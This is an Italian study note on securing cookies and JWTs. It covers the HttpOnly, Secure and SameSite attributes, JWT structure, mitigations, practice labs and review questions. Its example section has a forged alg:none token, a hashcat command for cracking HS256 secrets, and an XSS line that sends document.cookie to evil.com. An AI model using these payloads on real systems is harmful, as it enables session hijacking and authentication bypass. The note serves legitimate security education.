---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 4
aggiornato: 2026-07-02
stato: maturo
aliases: ["Cookie e JWT"]

---

# Cookie e JWT

> **Nota etica**: le tecniche descritte vanno studiate e praticate solo su ambienti autorizzati (PortSwigger Web Academy, DVWA, TryHackMe). Usarle su sistemi reali senza permesso è illegale.

## In breve

**Cookie** e **JWT (JSON Web Token)** sono i due meccanismi principali per mantenere l'identità dell'utente tra richieste HTTP stateless. Entrambi hanno configurazioni critiche per la sicurezza: un errore di configurazione può portare a furto di sessione, bypass dell'autenticazione o escalation di privilegi.

## Come funziona

### Cookie di sessione
Il server imposta un cookie con `Set-Cookie`; il browser lo reinvia automaticamente in ogni richiesta. Attributi di sicurezza fondamentali:

| Attributo | Effetto |
|-----------|---------|
| `HttpOnly` | JavaScript non può leggere il cookie (protegge da XSS) |
| `Secure` | Il cookie viaggia solo su HTTPS |
| `SameSite=Strict` | Non inviato in richieste cross-site (protegge da CSRF) |
| `Expires/Max-Age` | Scadenza del cookie |

### JWT
Un JWT è composto da tre parti Base64url-separate da punti:
```
header.payload.signature
```
- **Header**: algoritmo usato (es. `HS256`, `RS256`)
- **Payload**: claims (dati), es. `{"sub":"1","role":"user","exp":1234567890}`
- **Signature**: garantisce che il token non sia stato alterato

Il JWT è **stateless**: il server non tiene traccia delle sessioni, verifica solo la firma.

## Esempio pratico

Vulnerabilità classica JWT — algoritmo `none`:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.
```
Decodificato: `{"alg":"none"}` — alcuni server accettano JWT senza firma, permettendo di forgiare qualsiasi token.

Vulnerabilità `alg: HS256` con chiave debole:
```bash
# Con jwt_tool o hashcat si può trovare la secret key per brute force
hashcat -a 0 -m 16500 <token_jwt> wordlist.txt
```

Cookie senza `HttpOnly` — rubabile via XSS:
```javascript
// Eseguito in un XSS
fetch('https://evil.com/?c=' + document.cookie)
```

## Mitigazione e difesa

**Cookie:**
- Impostare sempre `HttpOnly`, `Secure`, `SameSite=Strict` (o `Lax`)
- Usare nomi prefissati: `__Secure-` o `__Host-` per protezioni aggiuntive del browser

**JWT:**
- Usare algoritmi asimmetrici robusti (`RS256`, `ES256`) invece di `HS256` quando possibile
- **Non accettare mai** l'algoritmo `none`
- Usare **secret key lunghe e casuali** (almeno 256 bit) per HMAC
- Verificare sempre `exp` (scadenza) e `iss` (emittente)
- Revocare i JWT compromessi tramite una denylist o usando scadenze brevi con refresh token

## Lab
- [[PortSwigger Web Academy]] → categoria **JWT attacks**. Percorso dal livello APPRENTICE:
  - *JWT authentication bypass via unverified signature* — il server non verifica affatto la firma.
  - *JWT authentication bypass via flawed signature verification* — accetta `alg: none`.
  - *JWT authentication bypass via weak signing key* — brute force del segreto HS256 con wordlist.
  - *...via jwk/kid header injection* e *via algorithm confusion* (PRACTITIONER) — abuso degli header del JWT.
- Cosa esercitare: usare l'estensione **JWT Editor** di [[Burp Suite]] per alterare header/payload e ri-firmare; per il brute della chiave HS256 usare `hashcat -m 16500` come nell'esempio sopra.

## Domande
1. **D:** Da quali tre parti è composto un JWT e cosa contengono?  **R:** `header.payload.signature` (Base64url separate da punti): l'header indica l'algoritmo, il payload contiene i claim (dati), la firma garantisce l'integrità del token.
2. **D:** Perché l'attacco `alg: none` è pericoloso?  **R:** Se il server accetta un JWT con algoritmo `none`, il token è valido senza firma: l'attaccante può forgiare qualunque payload (es. `role: admin`) e autenticarsi.
3. **D:** Cosa protegge l'attributo `HttpOnly` di un cookie e da cosa NON protegge?  **R:** Impedisce a JavaScript di leggere il cookie (mitiga il furto via XSS); non protegge da CSRF né da sniffing di rete (per quelli servono `SameSite` e `Secure`).
4. **D:** Perché un JWT è definito "stateless" e quale conseguenza ha sulla revoca?  **R:** Il server non memorizza la sessione, verifica solo la firma; quindi non può "cancellare" un token già emesso: serve una denylist o scadenze brevi con refresh token.
5. **D:** A cosa servono i prefissi `__Secure-` e `__Host-` nei nomi dei cookie?  **R:** Impongono vincoli lato browser (es. `__Host-` richiede `Secure`, path `/` e niente `Domain`), rendendo il cookie più difficile da sovrascrivere o iniettare.

## Collegamenti

- [[Autenticazione e Gestione Sessioni]]
- [[Cross-Site Scripting (XSS)]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[HTTP e HTTPS]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti

- PortSwigger JWT Attacks: https://portswigger.net/web-security/jwt
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP JWT Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- MDN Set-Cookie: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
